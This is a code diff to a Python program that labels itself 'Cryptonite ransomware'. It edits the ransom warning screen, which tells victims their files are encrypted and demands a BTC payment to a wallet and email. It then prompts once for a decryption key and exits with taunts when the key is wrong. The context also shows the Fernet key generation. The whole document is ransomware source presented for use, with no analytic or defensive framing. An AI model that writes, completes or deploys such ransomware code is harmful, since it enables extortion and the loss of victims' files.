@@ -1,4 +1,5 @@
 # imports
+
 import subprocess
 import sys
 import os
@@ -12,7 +13,9 @@ import tqdm
 import pymsgbox._native_win as pymsgbox
 import pymsgbox as pmb
 
+
 # ----------------> Cryptonite program begins here. <---------------- #
+
 
 key = Fernet.generate_key()
 fe = Fernet(key)
@@ -135,18 +138,22 @@ class System(Cryptonite):
 
     def warningScreen(self):
         warningMessage = f"Your device is infected by CRYPTONITE RANSOMWARE. It uses a military grade encryption to encrypt your files\n\n.If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\nBTC wallet address:- {BTC_WALLET}\nEmail address:- {EMAIL}\n\n\nYour unique key: {self.uniqueKey}\n\n"
-        Alert = pmb.alert("Your device has been Infected by CRYPTONITE RANSOMWARE! Click OK to know further", "ALERT!")
+        pmb.alert("Your device has been Infected by CRYPTONITE RANSOMWARE! Click OK to know further", "ALERT!")
         OK = pmb.confirm(text=warningMessage, title="Cryptn8", buttons=['I Understood', 'Fuck You!'])
         if OK == "I Understood":
             x = pmb.prompt("Decryption key: ", "Enter the Decryption key (ONE CHANCE)")
-            x = int(x)
+            try:
+                x = int(x)
+            except:
+                pmb.confirm("Have a Great Day! XD", buttons=['Cancel'])
+                exit()
             if x == self.decryptPlease:
                 self.decrypt()
             else:
-                pmb.confirm("Have a Great Day!", buttons=['Cancel'])
+                pmb.confirm("Have a Great Day! XD", buttons=['Cancel'])
                 exit()
         else:
-            pmb.confirm("Have a Great Day!", buttons=['Cancel'])
+            pmb.confirm("Have a Great Day! XD", buttons=['Cancel'])
             exit()
 
 
